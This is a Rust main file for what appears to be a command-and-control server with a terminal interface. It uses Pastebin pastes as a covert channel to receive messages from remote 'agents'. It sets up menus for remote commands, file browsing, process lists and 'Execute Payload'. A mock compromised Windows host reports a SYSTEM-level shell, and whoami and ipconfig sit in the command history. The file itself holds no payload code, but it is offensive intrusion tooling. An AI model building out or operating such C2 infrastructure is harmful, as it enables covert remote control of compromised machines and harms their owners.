#![allow(dead_code)]

use crate::api::pastebin::models::{AgentMessage, Paste};
use crate::api::pastebin::requests::get_paste;
use crate::crux::handler::EventHandler;
use async_trait::async_trait;
use ratatui::widgets::ListState;
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::{Mutex, mpsc};
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt, EnvFilter};
use crate::tui::logger::TuiLogger;

mod api;
mod crux;
mod service;
mod tui;
mod mock_agent;
mod db;

use crate::crux::state::{AppState, MenuContext, MenuState, ViewMode, process_agent_message, LogEntry};

struct Handler {
    app_state: Arc<Mutex<AppState>>,
    mock_tx: mpsc::Sender<AgentMessage>,
}

#[async_trait]
impl EventHandler for Handler {
    async fn on_paste(&self, paste: Paste) {
        let mut state = self.app_state.lock().await;
        
        // Fetch paste content
        if let Ok(content) = get_paste(&paste.paste_key).await {
             // Try to parse as AgentMessage, otherwise wrap raw content
             let agent_msg = serde_json::from_str::<AgentMessage>(&content.hello).unwrap_or(AgentMessage {
                 msg_type: "raw".to_string(),
                 payload: content.hello.clone(),
                 timestamp: None,
             });
             
             process_agent_message(&mut state, agent_msg.clone(), self.mock_tx.clone()).await;

             state.paste_content.insert(paste.paste_key.clone(), agent_msg);
        }

        state.pastes.push(Arc::new(paste));
    }
}

#[tokio::main]
async fn main() {
    // Initialize Database
    let db_pool = db::init_db("sqlite:crux.db").await.expect("Failed to initialize database");

    // Initialize AppState first so we can pass it to the logger
    let mut initial_pastes = vec![];
    let mut initial_content = HashMap::new();
    
    // ... (Mock Data setup moved down or kept here) ...
    
    // Mock Agent
    let mock_paste = Arc::new(Paste {
        paste_key: "mock_key_123".to_string(),
        paste_date: 1700000000,
        paste_title: "Workstation-01".to_string(),
        paste_size: 100,
        paste_expire_date: 0,
        paste_private: 1,
        paste_format_long: "json".to_string(),
        paste_format_short: "json".to_string(),
        paste_url: "https://pastebin.com/mock".to_string(),
        paste_hits: 0,
    });
    initial_pastes.push(mock_paste.clone());

    let mock_msg = AgentMessage {
        msg_type: "output".to_string(),
        payload: "Microsoft Windows [Version 10.0.19045.4291]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Users\\Admin>whoami\nnt authority\\system".to_string(),
        timestamp: Some(1700000000),
    };
    initial_content.insert("mock_key_123".to_string(), mock_msg);

    let app_state = Arc::new(Mutex::new(AppState {
        pastes: initial_pastes,
        paste_content: initial_content,
        list_state: ListState::default(),
        input_buffer: String::new(),
        input_mode: false,
        logs: vec![
            crate::crux::state::LogEntry {
                message: "Server started...".to_string(),
                level: "INFO".to_string(),
                count: 1,
                timestamp: chrono::Utc::now().timestamp(),
            }
        ],
        command_history: vec!["whoami".to_string(), "ipconfig".to_string()],
        history_index: 2,
        menu_state: MenuState {
            active: false,
            context: MenuContext::Main,
            items: vec![
                "System Info".to_string(),
                "Host Commands".to_string(),
                "Quick Command".to_string(),
                "File Browser".to_string(),
                "Process List".to_string(),
                "Execute Payload".to_string(),
                "Logs".to_string(), // Added Logs item
                "Back".to_string(),
            ],
            selected_index: 0,
        },
        menu_input_buffer: String::new(),
        view_mode: ViewMode::Dashboard,
        agents: HashMap::new(),
        tasks: HashMap::new(),
        file_list: vec![],
        process_list: vec![],
        payload_list: vec![],
        db: db_pool,
    }));

    // Initialize Tracing
    let args: Vec<String> = std::env::args().collect();
    let debug_mode = args.contains(&"--debug".to_string());
    
    let filter = if debug_mode { 
        "debug,hyper=info,reqwest=info,tower_http=info" 
    } else { 
        "info" 
    };
    
    // We only want to log to TUI, not stdout, to avoid breaking the UI
    let tui_layer = TuiLogger::new(app_state.clone());
    
    tracing_subscriber::registry()
        .with(EnvFilter::new(filter))
        .with(tui_layer)
        .init();

    let (mock_tx, mut mock_rx) = mpsc::channel::<AgentMessage>(100);

    let handler = Handler {
        app_state: app_state.clone(),
        mock_tx: mock_tx.clone(),
    };
    
    // Spawn Local Message Listener
    let app_state_clone = app_state.clone();
    let mock_tx_clone = mock_tx.clone();
    tokio::spawn(async move {
        while let Some(msg) = mock_rx.recv().await {
            let mut state = app_state_clone.lock().await;
            process_agent_message(&mut state, msg, mock_tx_clone.clone()).await;
        }
    });

    let (shutdown_tx, shutdown_rx) = tokio::sync::oneshot::channel();

    let server_handle = tokio::spawn(async move {
        tokio::select! {
            _ = crux::serve(handler) => {},
            _ = shutdown_rx => {},
        }
    });

    // Start Axum Server
    let axum_state = app_state.clone();
    tokio::spawn(async move {
        api::server::run_server(axum_state, 8080).await;
    });

    // Run TUI in a separate thread to avoid blocking the tokio runtime
    let tui_state = app_state.clone();
    let tui_handle = std::thread::spawn(move || {
        tui::run(tui_state);
    });

    // Wait for TUI to finish (user quits)
    let _ = tui_handle.join();

    // Then shutdown the server
    let _ = shutdown_tx.send(());
    let _ = server_handle.await;
}
